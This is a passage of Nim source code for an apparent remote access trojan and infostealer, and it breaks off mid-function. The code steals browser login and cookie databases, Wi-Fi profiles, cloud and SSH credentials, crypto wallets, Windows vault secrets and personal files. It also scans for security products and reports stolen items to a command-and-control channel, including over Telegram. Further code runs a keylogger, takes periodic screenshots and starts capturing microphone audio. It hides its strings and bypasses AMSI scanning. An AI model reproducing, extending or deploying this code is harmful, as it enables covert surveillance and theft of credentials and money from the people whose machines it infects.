      if not dirExists(base): continue
      for profile in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
        let pdir = base / profile
        if not dirExists(pdir): continue
        for dbName in ["History", "Login Data", "Cookies", "Web Data", "Bookmarks"]:
          let src = pdir / dbName
          if fileExists(src):
            if copyFileTo(src, dst / profile / dbName):
              copied.add(profile & "/" & dbName)
        # Local State lives in the User Data dir, not inside the profile.
        let ls = base / "Local State"
        if fileExists(ls):
          discard copyFileTo(ls, dst / profile / "Local State")
        break
    return %* {"type": "exfil", "kind": "browser",
               "files": copied, "staging": dst, "count": copied.len}

  proc exfilWifiPasswords(): JsonNode =
    let dst = stageDir() / "wifi"
    createDir(dst)
    let cmd = obfStr(S_NETSH) & " " & obfStr(S_WLAN) & " " & obfStr(S_PROFILE) & "\"" & dst & "\""
    discard execHidden(cmd)
    let files = walkFiles(dst / "*.xml").toSeq
    return %* {"type": "exfil", "kind": "wifi",
               "files": files, "staging": dst, "count": files.len}

  proc exfilCloudTokens(): JsonNode =
    let dst = stageDir() / "cloud"
    createDir(dst)
    var copied: seq[string] = @[]
    let userProfile = getEnv(obfStr(S_USERPROFILE), expandTilde("~"))
    let pairs = [
      (userProfile / obfStr(S_AWS) / obfStr(S_AWS_CREDS), "aws_credentials"),
      (userProfile / obfStr(S_AWS) / "config", "aws_config"),
      (userProfile / obfStr(S_GCONFIG) / obfStr(S_GCLOUD) / "credentials", "gcp_credentials"),
      (userProfile / obfStr(S_AZ), "azure"),
      (userProfile / obfStr(S_GIT), "git_credentials"),
      (userProfile / obfStr(S_KUBE) / "config", "kubeconfig")
    ]
    for (src, label) in pairs:
      if fileExists(src):
        if copyFileTo(src, dst / label): copied.add(label)
    return %* {"type": "exfil", "kind": "cloud",
               "files": copied, "staging": dst, "count": copied.len}

  proc exfilSshKeys(): JsonNode =
    let dst = stageDir() / "ssh"
    createDir(dst)
    var copied: seq[string] = @[]
    let ssh = getEnv(obfStr(S_USERPROFILE), expandTilde("~")) / obfStr(S_SSH_DIR)
    if dirExists(ssh):
      for f in walkFiles(ssh / "*"):
        let name = f.extractFilename
        if name.startsWith(obfStr(S_ID_RSA)) or name == obfStr(S_KH) or
           name == "config" or name.endsWith(".pub"):
          if copyFileTo(f, dst / name): copied.add(name)
    return %* {"type": "exfil", "kind": "ssh",
               "files": copied, "staging": dst, "count": copied.len}

  proc exfilMediaFiles(): JsonNode =
    let dst = stageDir() / "media"
    createDir(dst)
    let mediaExts = ["mp3","wav","m4a","flac","ogg","wma",
                     "mp4","mkv","avi","mov","wmv","webm","m4v","3gp"]
    var copied: seq[string] = @[]
    var totalBytes: int64 = 0
    const cap = 500 * 1024 * 1024
    let userProf = getEnv(obfStr(S_USERPROFILE), expandTilde("~"))
    let roots = @[userProf / "Videos", userProf / "Music",
                  userProf / "Downloads", userProf / "Documents"]
    for root in roots:
      if not dirExists(root): continue
      try:
        for f in walkFiles(root):
          let ext = f.splitFile.ext.toLowerAscii
          if ext in mediaExts and totalBytes < cap:
            let sz = getFileSize(f).int64
            if sz > 100 * 1024 * 1024: continue
            if totalBytes + sz > cap: break
            let name = f.extractFilename
            if copyFileTo(f, dst / name):
              copied.add(name)
              totalBytes += sz
      except: discard
    return %* {"type": "exfil", "kind": "media",
               "files": copied, "staging": dst,
               "count": copied.len, "bytes": totalBytes}

  proc exfilWalletData(): JsonNode =
    let dst = stageDir() / "wallet"
    createDir(dst)
    var copied: seq[string] = @[]
    let userProfile = getEnv(obfStr(S_USERPROFILE), expandTilde("~"))
    let localApp = getEnv(obfStr(S_LOCALAPPDATA), expandTilde("~"))
    let pairs = [
      (userProfile / obfStr(S_ETHEREUM) / obfStr(S_ETH_KEYSTORE), "eth_keystore"),
      (userProfile / obfStr(S_BITCOIN) / obfStr(S_WALLET_DAT), "btc_wallet"),
      (localApp / obfStr(S_CHROME) / obfStr(S_DEFAULT_DIR) /
        "Local Extension Settings" / "nkbihfbeogaeaoehlefnkodbefgpgknn", "metamask"),
      (localApp / obfStr(S_EDGE) / obfStr(S_DEFAULT_DIR) /
        "Local Extension Settings" / "nkbihfbeogaeaoehlefnkodbefgpgknn", "metamask_edge")
    ]
    for (src, label) in pairs:
      if fileExists(src) or dirExists(src):
        try:
          if dirExists(src):
            for f in walkFiles(src):
              let rel = f.relativePath(src)
              if copyFileTo(f, dst / label / rel): copied.add(label & "/" & rel)
          else:
            if copyFileTo(src, dst / label): copied.add(label)
        except: discard
    return %* {"type": "exfil", "kind": "wallet",
               "files": copied, "staging": dst, "count": copied.len}

  proc exfilRecentFiles(): JsonNode =
    let dst = stageDir() / "recent"
    createDir(dst)
    let recentDir = getEnv(obfStr(S_APPDATA), expandTilde("~")) /
                    "Microsoft\\Windows\\Recent"
    var copied: seq[string] = @[]
    if dirExists(recentDir):
      for f in walkFiles(recentDir / "*.lnk"):
        if copyFileTo(f, dst / f.extractFilename): copied.add(f.extractFilename)
    return %* {"type": "exfil", "kind": "recent",
               "files": copied, "staging": dst, "count": copied.len}

  proc exfilWinCreds(): JsonNode =
    try:
      let (outp, code) = execHidden(obfStr(S_VAULTCMD))
      let dst = stageDir() / "wincreds.txt"
      writeFile(dst, outp)
      return %* {"type": "exfil", "kind": "wincreds", "staging": dst,
                 "count": outp.splitLines.len, "exit": code}
    except CatchableError as e:
      return %* {"type": "exfil", "kind": "wincreds", "error": e.msg}

# =============================================================================
# Recon
# =============================================================================
when defined(windows):
  proc reconEdrAv(): JsonNode =
    # csrss.exe is a core Windows subsystem process, not EDR — removed.
    let indicators = [
      obfStr(S_EDR_1), obfStr(S_EDR_2), obfStr(S_EDR_3), obfStr(S_EDR_4),
      obfStr(S_EDR_5), obfStr(S_EDR_6), obfStr(S_EDR_7), obfStr(S_EDR_8),
      obfStr(S_EDR_9), obfStr(S_EDR_10), obfStr(S_EDR_11), obfStr(S_EDR_12),
      obfStr(S_EDR_13), obfStr(S_EDR_14), obfStr(S_EDR_15), obfStr(S_EDR_16),
      obfStr(S_EDR_17), obfStr(S_EDR_18), obfStr(S_EDR_19), obfStr(S_EDR_20)
    ]
    try:
      let (outp, _) = execHidden(obfStr(S_TASKLIST))
      var hits: seq[string] = @[]
      for line in outp.splitLines:
        let lower = line.toLowerAscii
        for ind in indicators:
          if lower.contains(ind.toLowerAscii): hits.add(ind)
      return %* {"type": "recon", "kind": "edr", "hits": hits.deduplicate(false)}
    except CatchableError as e:
      return %* {"type": "recon", "kind": "edr", "error": e.msg}

  proc reconNetShares(): JsonNode =
    try:
      let (view, _)  = execHidden(obfStr(S_NETSH_VIEW))
      let (share, _) = execHidden(obfStr(S_NETSH_SHARE))
      let (sess, _)  = execHidden(obfStr(S_NETSH_SESSION))
      return %* {"type": "recon", "kind": "shares",
                 "view": view, "share": share, "sessions": sess}
    except CatchableError as e:
      return %* {"type": "recon", "kind": "shares", "error": e.msg}

  proc reconSoftware(): JsonNode =
    try:
      let (sw, _) = execHidden(obfStr(S_WMIC_PRODUCT))
      let (patches, _) = execHidden(obfStr(S_WMIC_QFE))
      let dst = stageDir() / "software.txt"
      writeFile(dst, sw & "\n=== PATCHES ===\n" & patches)
      return %* {"type": "recon", "kind": "software", "staging": dst,
                 "products": sw.splitLines.filterIt(it.contains("Name=")).len,
                 "patches": patches.splitLines.filterIt(it.contains("HotFixID=")).len}
    except CatchableError as e:
      return %* {"type": "recon", "kind": "software", "error": e.msg}

  proc reconUsbHistory(): JsonNode =
    try:
      let (outp, _) = execHidden("reg query \"" & obfStr(S_REG_USBSTOR) & "\" /s")
      let (mounted, _) = execHidden("reg query \"" & obfStr(S_REG_MOUNTED) & "\"")
      let dst = stageDir() / "usb.txt"
      writeFile(dst, outp & "\n=== MOUNTED ===\n" & mounted)
      return %* {"type": "recon", "kind": "usb", "staging": dst,
                 "devices": outp.splitLines.filterIt(it.contains("FriendlyName")).len}
    except CatchableError as e:
      return %* {"type": "recon", "kind": "usb", "error": e.msg}

  proc reconScheduledTasks(): JsonNode =
    try:
      let (outp, _) = execHidden(obfStr(S_SCHTASKS_QRY))
      let dst = stageDir() / "tasks.txt"
      writeFile(dst, outp)
      return %* {"type": "recon", "kind": "tasks", "staging": dst,
                 "count": outp.splitLines.filterIt(it.contains("TaskName:")).len}
    except CatchableError as e:
      return %* {"type": "recon", "kind": "tasks", "error": e.msg}

# =============================================================================
# Screenshot
# =============================================================================
when defined(windows):
  proc takeScreenshotBmp(): tuple[ok: bool, path: string, err: string] =
    try:
      let deskW = GetSystemMetrics(SM_CXSCREEN)
      let deskH = GetSystemMetrics(SM_CYSCREEN)
      if deskW == 0 or deskH == 0: return (false, "", "screen metrics unavailable")
      let hDesk = GetDesktopWindow()
      let hSrc = GetDC(hDesk)
      if hSrc == 0: return (false, "", "GetDC failed")
      let hDst = CreateCompatibleDC(hSrc)
      let hBmp = CreateCompatibleBitmap(hSrc, deskW, deskH)
      if hDst == 0 or hBmp == 0:
        discard ReleaseDC(hDesk, hSrc)
        return (false, "", "alloc failed")
      let old = SelectObject(hDst, hBmp)
      discard BitBlt(hDst, 0, 0, deskW, deskH, hSrc, 0, 0, SRCCOPY)
      var info: BITMAPINFO
      info.bmiHeader.biSize = DWORD(sizeof(BITMAPINFOHEADER))
      info.bmiHeader.biWidth = deskW
      info.bmiHeader.biHeight = -deskH
      info.bmiHeader.biPlanes = 1
      info.bmiHeader.biBitCount = 32
      info.bmiHeader.biCompression = BI_RGB
      let stride = deskW * 4
      var pixels = newSeq[byte](stride * deskH)
      discard GetDIBits(hDst, hBmp, 0, deskH, addr pixels[0],
                        cast[ptr BITMAPINFO](addr info), DIB_RGB_COLORS)
      SelectObject(hDst, old)
      DeleteObject(hBmp)
      DeleteDC(hDst)
      discard ReleaseDC(hDesk, hSrc)
      let fileHeaderSize = 14
      let infoHeaderSize = 40
      let pixelSize = pixels.len
      let fileSize = fileHeaderSize + infoHeaderSize + pixelSize
      var bmp = newSeqOfCap[byte](fileSize)
      bmp.add(0x42); bmp.add(0x4D)
      proc putU32(b: var seq[byte], v: uint32) =
        b.add(byte(v and 0xFF)); b.add(byte((v shr 8) and 0xFF))
        b.add(byte((v shr 16) and 0xFF)); b.add(byte((v shr 24) and 0xFF))
      proc putI32(b: var seq[byte], v: int32) =
        b.add(byte(v and 0xFF)); b.add(byte((v shr 8) and 0xFF))
        b.add(byte((v shr 16) and 0xFF)); b.add(byte((v shr 24) and 0xFF))
      putU32(bmp, uint32(fileSize))
      bmp.add(0); bmp.add(0); bmp.add(0); bmp.add(0)
      putU32(bmp, uint32(fileHeaderSize + infoHeaderSize))
      putU32(bmp, uint32(infoHeaderSize))
      putI32(bmp, int32(deskW))
      # The DIB captured from GetDIBits is top-down (biHeight = -deskH).
      # The file header must match, or viewers render inverted.
      putI32(bmp, int32(-deskH))
      bmp.add(1); bmp.add(0)
      bmp.add(32); bmp.add(0)
      putU32(bmp, uint32(0))
      putU32(bmp, uint32(pixelSize))
      for _ in 0..<16: bmp.add(0)
      bmp.add(pixels)
      let tmp = getEnv("TEMP", getEnv("USERPROFILE", ".")) /
                (BuildPrefix & "_shot.bmp")
      writeFile(tmp, cast[string](bmp))
      return (true, tmp, "")
    except CatchableError as e:
      return (false, "", e.msg)

  proc takeScreenshotPs(): tuple[ok: bool, path: string, err: string] =
    let tmp = getEnv("TEMP", getEnv("USERPROFILE", ".")) /
              (BuildPrefix & "_shot.png")
    let safeTmp = tmp.replace('\\', '/').replace("'", "''")
    let ps =
      "Add-Type -AssemblyName System.Windows.Forms;" &
      "Add-Type -AssemblyName System.Drawing;" &
      "$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;" &
      "$bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height;" &
      "$g = [System.Drawing.Graphics]::FromImage($bmp);" &
      "$g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size);" &
      "$bmp.Save('" & safeTmp & "', " &
      "[System.Drawing.Imaging.ImageFormat]::Png);" &
      "$g.Dispose(); $bmp.Dispose();"
    try:
      let (outp, exitCode) = execHidden(psRun(ps))
      if not fileExists(tmp):
        return (false, "", "screenshot failed (exit " & $exitCode & "): " &
                outp[0..<min(outp.len, 300)])
      return (true, tmp, "")
    except CatchableError as e:
      return (false, "", e.msg)

# =============================================================================
# Auto-drive (WS)
# =============================================================================
when defined(c2_ws) or defined(c2_both):
  when defined(windows):
    var autoDriveRunning = false
    var autoDriveSeenSlot: ref string
    new(autoDriveSeenSlot)
    autoDriveSeenSlot[] = ""

    proc getSeenFile(): string {.gcsafe.} =
      {.cast(gcsafe).}: result = autoDriveSeenSlot[]

    proc setSeenFile(s: string) {.gcsafe.} =
      {.cast(gcsafe).}: autoDriveSeenSlot[] = s

    proc initAutoDrive() {.gcsafe.} =
      setSeenFile(getEnv("TEMP", expandTilde("~")) / ".svc_audit")
      let f = getSeenFile()
      if fileExists(f):
        try: removeFile(f) except: discard
      autoDriveRunning = true

    proc autoDriveSeen(): Table[string, bool] {.gcsafe.} =
      result = initTable[string, bool]()
      let f = getSeenFile()
      if f.len > 0 and fileExists(f):
        try:
          for line in readFile(f).splitLines():
            if line.strip.len > 0: result[line] = true
        except: discard

    proc autoDriveMarkSeen(paths: openArray[string]) {.gcsafe.} =
      let f = getSeenFile()
      if f.len == 0: return
      try:
        let fh = open(f, fmAppend)
        defer: fh.close()
        for p in paths: fh.writeLine(p)
      except: discard

    proc autoDriveDiscover(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}) {.async, gcsafe.} =
      var seen = autoDriveSeen()
      var newFound: seq[string] = @[]
      proc emit(kind, path: string, extra: JsonNode = nil) {.async, gcsafe.} =
        let key = kind & "|" & path
        if seen.getOrDefault(key, false): return
        seen[key] = true
        newFound.add(key)
        var entry = %* {"type": "loot", "kind": kind, "path": path}
        if fileExists(path):
          try:
            entry["size"] = %(getFileSize(path).int)
            entry["mtime"] = %(getLastModificationTime(path).toUnix().int)
          except: discard
        if extra != nil:
          for k, v in extra.pairs: entry[k] = v
        await sendToC2(entry)
        await sleepAsync(50)

      let localApp = getEnv(obfStr(S_LOCALAPPDATA), expandTilde("~"))
      for (sub, brand) in [
          (obfStr(S_CHROME) & "\\User Data", "chrome"),
          (obfStr(S_EDGE) & "\\User Data", "edge"),
          (obfStr(S_FIREFOX) & "\\Profiles", "firefox")]:
        let base = localApp / sub
        if not dirExists(base): continue
        if brand != "firefox":
          for prof in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
            let pdir = base / prof
            if dirExists(pdir):
              for db in ["Login Data", "Cookies", "Web Data", "History", "Bookmarks"]:
                let f = pdir / db
                if fileExists(f): await emit("browser", f,
                  %* {"browser": brand, "profile": prof})
              let ls = base / "Local State"
              if fileExists(ls): await emit("browser", ls,
                %* {"browser": brand, "label": brand & "/Local State"})
        else:
          for d in walkDirs(base / "*"):
            if dirExists(d):
              for db in ["logins.json", "cookies.sqlite", "key4.db", "cert9.db", "places.sqlite"]:
                let f = d / db
                if fileExists(f): await emit("browser", f, %* {"browser": "firefox"})

      let sshDir = getEnv(obfStr(S_USERPROFILE), expandTilde("~")) / obfStr(S_SSH_DIR)
      if dirExists(sshDir):
        for f in walkFiles(sshDir / "*"):
          let n = f.extractFilename
          if n.startsWith(obfStr(S_ID_RSA)) or n == obfStr(S_KH) or
             n == "config" or n.endsWith(".pub"):
            await emit("ssh", f)

      let uprof = getEnv(obfStr(S_USERPROFILE), expandTilde("~"))
      let cloudEntries = [
        (uprof / obfStr(S_AWS) / obfStr(S_AWS_CREDS), "AWS credentials"),
        (uprof / obfStr(S_AWS) / "config", "AWS config"),
        (uprof / obfStr(S_GCONFIG) / obfStr(S_GCLOUD) / "credentials", "GCP"),
        (uprof / obfStr(S_AZ), "Azure"),
        (uprof / obfStr(S_GIT), "Git creds"),
        (uprof / obfStr(S_KUBE) / "config", "kubeconfig")
      ]
      for (p, lbl) in cloudEntries:
        if fileExists(p): await emit("cloud", p, %* {"label": lbl})

      let eth = uprof / obfStr(S_ETHEREUM)
      if dirExists(eth):
        for d in [eth / obfStr(S_ETH_KEYSTORE), eth / "keystore"]:
          if dirExists(d):
            for f in walkFiles(d / "*"):
              await emit("wallet", f)
      let btc = uprof / obfStr(S_BITCOIN) / obfStr(S_WALLET_DAT)
      if fileExists(btc): await emit("wallet", btc)

      let recentDir = getEnv(obfStr(S_APPDATA), expandTilde("~")) /
                      "Microsoft\\Windows\\Recent"
      if dirExists(recentDir):
        for f in walkFiles(recentDir / "*.lnk"):
          await emit("recent", f)

      let docsRoot = uprof / "Documents"
      if dirExists(docsRoot):
        try:
          for f in walkFiles(docsRoot / "*"):
            let ext = f.splitFile.ext.toLowerAscii
            if ext in [".pdf", ".docx", ".xlsx", ".txt", ".csv",
                       ".pem", ".env", ".yml", ".key"]:
              try:
                let sz = getFileSize(f).int
                if sz > 0 and sz < 10 * 1024 * 1024:
                  await emit("doc", f)
              except: discard
        except: discard

      if newFound.len > 0: autoDriveMarkSeen(newFound)
      await sendToC2(%* {"type": "output",
        "data": "[*] auto-drive scan complete - " & $newFound.len &
                " new finds"})

    proc autoDriveLoop(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}) {.async, gcsafe.} =
      while autoDriveRunning:
        try: await autoDriveDiscover(sendToC2)
        except CatchableError as e: await sendToC2(%* {"type": "output",
          "data": "[!] auto-drive: " & e.msg})
        for _ in 0..<600:
          if not autoDriveRunning: return
          await sleepAsync(100)

# =============================================================================
# Surveillance (c2_tg only)
# =============================================================================
when defined(c2_tg):
  var
    watchActive: Atomic[bool]
    watchIntervalMs: int = 30000
    watchMaxShots: int = -1
    watchShotsTaken: int = 0
    watchThread: Thread[void]

  proc watchLoop() {.thread, gcsafe.} =
    when defined(windows):
      discard armAmsiHwbpCurrentThread()
    while watchActive.load:
      sleep(watchIntervalMs)
      if not watchActive.load: break
      if watchMaxShots > 0 and watchShotsTaken >= watchMaxShots:
        watchActive.store(false)
        break
      let stamp = now().format("yyyy-MM-dd HH:mm:ss")
      let (ok, path, _) = takeScreenshotPs()
      if ok:
        {.cast(gcsafe).}:
          discard tgSendDocument(path, "watch @ " & stamp)
        try: removeFile(path) except: discard
        inc watchShotsTaken

  when defined(windows):
    const
      SURV_CALLBACK_NULL* = 0x00000000
      SURV_WAVE_FORMAT_PCM* = 0x0001
      SURV_MMSYSERR_NOERROR* = 0
      SURV_WHDR_DONE* = 0x00000001
      SURV_MIC_MAX_SECS     = 120
      SURV_MIC_SAMPLE_RATE  = 16000
      SURV_MIC_CHANNELS     = 1
      SURV_MIC_BITS         = 16
      SURV_MIC_BUF_COUNT    = 4
      SURV_MIC_BUF_MS       = 250
    type
      SW_HWAVEIN* = HANDLE
      SW_LPHWAVEIN* = ptr SW_HWAVEIN
      SW_MMRESULT* = UINT
      SW_WAVEHDR* {.pure.} = object
        lpData*: LPSTR
        dwBufferLength*: DWORD
        dwBytesRecorded*: DWORD
        dwUser*: UINT
        dwFlags*: DWORD
        dwLoops*: DWORD
        lpNext*: pointer
        reserved*: UINT
      SW_LPWAVEHDR* = ptr SW_WAVEHDR
      SW_WAVEFORMATEX* {.pure, packed.} = object
        wFormatTag*: WORD
        nChannels*: WORD
        nSamplesPerSec*: DWORD
        nAvgBytesPerSec*: DWORD
        nBlockAlign*: WORD
        wBitsPerSample*: WORD
        cbSize*: WORD
      SW_LPWFX* = ptr SW_WAVEFORMATEX

    let SW_WAVE_MAPPER* = UINT(-1)

    type
      TWaveInOpen          = proc(phwi: SW_LPHWAVEIN, uDeviceID: UINT,
                                  pwfx: SW_LPWFX, dwCallback: UINT_PTR,
                                  dwInstance: UINT_PTR, fdwOpen: DWORD): SW_MMRESULT {.stdcall, gcsafe.}
      TWaveInClose         = proc(hwi: SW_HWAVEIN): SW_MMRESULT {.stdcall, gcsafe.}
      TWaveInPrepareHeader = proc(hwi: SW_HWAVEIN, pwh: SW_LPWAVEHDR, cbwh: UINT): SW_MMRESULT {.stdcall, gcsafe.}
      TWaveInUnprepareHeader = proc(hwi: SW_HWAVEIN, pwh: SW_LPWAVEHDR, cbwh: UINT): SW_MMRESULT {.stdcall, gcsafe.}
      TWaveInAddBuffer     = proc(hwi: SW_HWAVEIN, pwh: SW_LPWAVEHDR, cbwh: UINT): SW_MMRESULT {.stdcall, gcsafe.}
      TWaveInStart         = proc(hwi: SW_HWAVEIN): SW_MMRESULT {.stdcall, gcsafe.}
      TWaveInStop          = proc(hwi: SW_HWAVEIN): SW_MMRESULT {.stdcall, gcsafe.}
      TWaveInReset         = proc(hwi: SW_HWAVEIN): SW_MMRESULT {.stdcall, gcsafe.}
      TCapCreateCaptureWindowA = proc(lpszWindowName: cstring, dwStyle: DWORD,
                                      x: int32, y: int32, nWidth: int32, nHeight: int32,
                                      hwndParent: HWND, nID: int32): HWND {.stdcall, gcsafe.}

    var
      winmmHandle: HMODULE = 0
      avicapHandle: HMODULE = 0
      pWaveInOpen:          TWaveInOpen          = nil
      pWaveInClose:         TWaveInClose         = nil
      pWaveInPrepareHeader: TWaveInPrepareHeader = nil
      pWaveInUnprepareHeader: TWaveInUnprepareHeader = nil
      pWaveInAddBuffer:     TWaveInAddBuffer     = nil
      pWaveInStart:         TWaveInStart         = nil
      pWaveInStop:          TWaveInStop          = nil
      pWaveInReset:         TWaveInReset         = nil
      pCapCreate:           TCapCreateCaptureWindowA = nil
      survLoadLock: Lock
    initLock(survLoadLock)

    proc loadWinmmOnce(): bool =
      if pWaveInOpen != nil and pWaveInStart != nil: return true
      withLock survLoadLock:
        if winmmHandle == 0:
          let dllName = obfStr(S_WINMM)
          winmmHandle = LoadLibraryA(cast[cstring](addr dllName[0]))
          if winmmHandle == 0: return false
        template resolve(p: typed, encBuf) =
          if p == nil:
            let fnName = obfStr(encBuf)
            let gp = GetProcAddress(winmmHandle, cast[cstring](addr fnName[0]))
            if gp == nil: return false
            p = cast[typeof(p)](gp)
        resolve(pWaveInOpen,          S_WINMM_OPEN)
        resolve(pWaveInClose,         S_WINMM_CLOSE)
        resolve(pWaveInPrepareHeader, S_WINMM_PREPARE)
        resolve(pWaveInUnprepareHeader, S_WINMM_UNPREPARE)
        resolve(pWaveInAddBuffer,     S_WINMM_ADDBUF)
        resolve(pWaveInStart,         S_WINMM_START)
        resolve(pWaveInStop,          S_WINMM_STOP)
        resolve(pWaveInReset,         S_WINMM_RESET)
        return true

    proc loadAvicapOnce(): bool =
      if pCapCreate != nil: return true
      withLock survLoadLock:
        if avicapHandle == 0:
          let dllName = obfStr(S_AVICAP32)
          avicapHandle = LoadLibraryA(cast[cstring](addr dllName[0]))
          if avicapHandle == 0: return false
        if pCapCreate == nil:
          let fnName = obfStr(S_AVICAP_CREATE)
          let gp = GetProcAddress(avicapHandle, cast[cstring](addr fnName[0]))
          if gp == nil: return false
          pCapCreate = cast[TCapCreateCaptureWindowA](gp)
        return true

    proc waveInOpen(phwi: SW_LPHWAVEIN, uDeviceID: UINT,
                    pwfx: SW_LPWFX, dwCallback: UINT_PTR,
                    dwInstance: UINT_PTR, fdwOpen: DWORD): SW_MMRESULT =
      if not loadWinmmOnce(): return 1
      pWaveInOpen(phwi, uDeviceID, pwfx, dwCallback, dwInstance, fdwOpen)
    proc waveInClose(hwi: SW_HWAVEIN): SW_MMRESULT =
      if not loadWinmmOnce(): return 1
      pWaveInClose(hwi)
    proc waveInPrepareHeader(hwi: SW_HWAVEIN, pwh: SW_LPWAVEHDR, cbwh: UINT): SW_MMRESULT =
      if not loadWinmmOnce(): return 1
      pWaveInPrepareHeader(hwi, pwh, cbwh)
    proc waveInUnprepareHeader(hwi: SW_HWAVEIN, pwh: SW_LPWAVEHDR, cbwh: UINT): SW_MMRESULT =
      if not loadWinmmOnce(): return 1
      pWaveInUnprepareHeader(hwi, pwh, cbwh)
    proc waveInAddBuffer(hwi: SW_HWAVEIN, pwh: SW_LPWAVEHDR, cbwh: UINT): SW_MMRESULT =
      if not loadWinmmOnce(): return 1
      pWaveInAddBuffer(hwi, pwh, cbwh)
    proc waveInStart(hwi: SW_HWAVEIN): SW_MMRESULT =
      if not loadWinmmOnce(): return 1
      pWaveInStart(hwi)
    proc waveInStop(hwi: SW_HWAVEIN): SW_MMRESULT =
      if not loadWinmmOnce(): return 1
      pWaveInStop(hwi)
    proc waveInReset(hwi: SW_HWAVEIN): SW_MMRESULT =
      if not loadWinmmOnce(): return 1
      pWaveInReset(hwi)
    proc capCreateCaptureWindowA(lpszWindowName: cstring, dwStyle: DWORD,
                                 x: int32, y: int32, nWidth: int32, nHeight: int32,
                                 hwndParent: HWND, nID: int32): HWND =
      if not loadAvicapOnce(): return 0
      pCapCreate(lpszWindowName, dwStyle, x, y, nWidth, nHeight, hwndParent, nID)

    var
      keylogBuffer = ""
      keyloggerRunning = false
      keylogHook: HHOOK = 0
      keylogThreadVar: Thread[void]

    proc vkToChar(vk: int32, shifted: bool): string =
      if vk >= 0x30 and vk <= 0x39:
        if shifted:
          case vk
          of 0x30: return ")"
          of 0x31: return "!"
          of 0x32: return "@"
          of 0x33: return "#"
          of 0x34: return "$"
          of 0x35: return "%"
          of 0x36: return "^"
          of 0x37: return "&"
          of 0x38: return "*"
          of 0x39: return "("
          else: discard
        return $char(vk)
      if vk >= 0x41 and vk <= 0x5A:
        if shifted: return $char(vk)
        return $char(vk + 0x20)
      if vk == VK_SPACE: return " "
      if vk == VK_RETURN: return "\n"
      if vk == VK_TAB: return "\t"
      if vk == VK_BACK: return "[BKSP]"
      if vk == VK_ESCAPE: return "[ESC]"
      if vk == VK_OEM_PERIOD: return "."
      if vk == VK_OEM_COMMA: return ","
      return ""

    proc utf8SafeTruncate(s: var string, maxLen: int) =
      if s.len <= maxLen: return
      var i = maxLen
      while i > 0 and (byte(s[i]) and 0xC0) == 0x80:
        dec i
      s = s[i .. ^1]

    proc lowLevelKeyboardProc(nCode: int32, wParam: WPARAM,
                              lParam: LPARAM): LRESULT {.stdcall.} =
      if nCode == HC_ACTION and (wParam == WM_KEYDOWN or wParam == WM_SYSKEYDOWN):
        let p = cast[ptr KBDLLHOOKSTRUCT](lParam)
        let vk = p.vkCode
        let shifted = (GetAsyncKeyState(VK_SHIFT) and 0x8000'i16) != 0
        let ch = vkToChar(vk, shifted)
        if ch.len > 0:
          keylogBuffer.add(ch)
          if keylogBuffer.len > KEYLOG_BUFFER_MAX:
            utf8SafeTruncate(keylogBuffer, KEYLOG_BUFFER_MAX div 2)
      result = CallNextHookEx(0, nCode, wParam, lParam)

    proc keyloggerThread() {.thread.} =
      when defined(windows):
        discard armAmsiHwbpCurrentThread()
      let hInst = GetModuleHandle(nil)
      keylogHook = SetWindowsHookExW(WH_KEYBOARD_LL, lowLevelKeyboardProc,
                                      hInst, 0)
      var msg: MSG
      while keyloggerRunning:
        let r = GetMessageW(addr msg, 0, 0, 0)
        if r <= 0: break
        discard TranslateMessage(addr msg)
        discard DispatchMessageW(addr msg)
      if keylogHook != 0:
        discard UnhookWindowsHookEx(keylogHook)
        keylogHook = 0

    proc keysDumpToFile(): string =
      if keylogBuffer.len == 0: return ""
      let path = getEnv("TEMP", getEnv("USERPROFILE", ".")) /
                 (BuildPrefix & "_keys_" & $(getTime().toUnix()) & ".txt")
      writeFile(path, keylogBuffer)
      keylogBuffer = ""
      return path

    proc cmdKeys(arg: string): string =
      case arg.strip().toLowerAscii()
      of "start":
        if keyloggerRunning: return "keylogger already running"
        keyloggerRunning = true
        keylogBuffer = ""
        try:
          createThread(keylogThreadVar, keyloggerThread)
        except CatchableError as e:
          keyloggerRunning = false
          return "err: " & e.msg
        return "[+] keylogger running - /keys stop to dump"
      of "stop":
        if not keyloggerRunning: return "keylogger not running"
        keyloggerRunning = false
        sleep(300)
        let path = keysDumpToFile()
        if path.len == 0: return "stopped (no keystrokes captured)"
        return "@file:" & path
      of "dump":
        if not keyloggerRunning: return "keylogger not running"
        let path = keysDumpToFile()
        if path.len == 0: return "no keystrokes yet"
        return "@file:" & path
      else:
        return "usage: /keys start | /keys dump | /keys stop"

    proc buildSurvWavHeader(sampleRate, channels, bitsPerSample, pcmLen: int): seq[byte] =
      let bytesPerSample = channels * (bitsPerSample div 8)
      let bytesPerSec = sampleRate * bytesPerSample
      proc putU32le(b: var seq[byte], v: int) =
        b.add(byte(v and 0xFF)); b.add(byte((v shr 8) and 0xFF))
        b.add(byte((v shr 16) and 0xFF)); b.add(byte((v shr 24) and 0xFF))
      proc putU16le(b: var seq[byte], v: int) =
        b.add(byte(v and 0xFF)); b.add(byte((v shr 8) and 0xFF))
      proc putTag(b: var seq[byte], tag: string) =
        for ch in tag: b.add(byte(ch))
      result = newSeqOfCap[byte](44)
      putTag(result, "RIFF")
      putU32le(result, 36 + pcmLen)
      putTag(result, "WAVE")
      putTag(result, "fmt ")
      putU32le(result, 16)
      putU16le(result, 1)
      putU16le(result, channels)
      putU32le(result, sampleRate)
      putU32le(result, bytesPerSec)
      putU16le(result, bytesPerSample)
      putU16le(result, bitsPerSample)
      putTag(result, "data")
      putU32le(result, pcmLen)

    proc captureMicSync(seconds: int): tuple[ok: bool, path, err: string] =
      let secs = clamp(seconds, 1, SURV_MIC_MAX_SECS)
      let sampleRate    = SURV_MIC_SAMPLE_RATE
      let channels      = SURV_MIC_CHANNELS
      let bitsPerSample = SURV_MIC_BITS
      let bytesPerSample = channels * (bitsPerSample div 8)
      let bytesPerSec    = sampleRate * bytesPerSample
      let pcmSize        = sampleRate * secs * bytesPerSample
      let bufSamples     = (sampleRate * SURV_MIC_BUF_MS) div 1000
      let bufSize        = bufSamples * bytesPerSample

      if not loadWinmmOnce():
        return (false, "", "[!] mic: winmm.dll unavailable")

      var fmt: SW_WAVEFORMATEX
      fmt.wFormatTag       = WORD(SURV_WAVE_FORMAT_PCM)
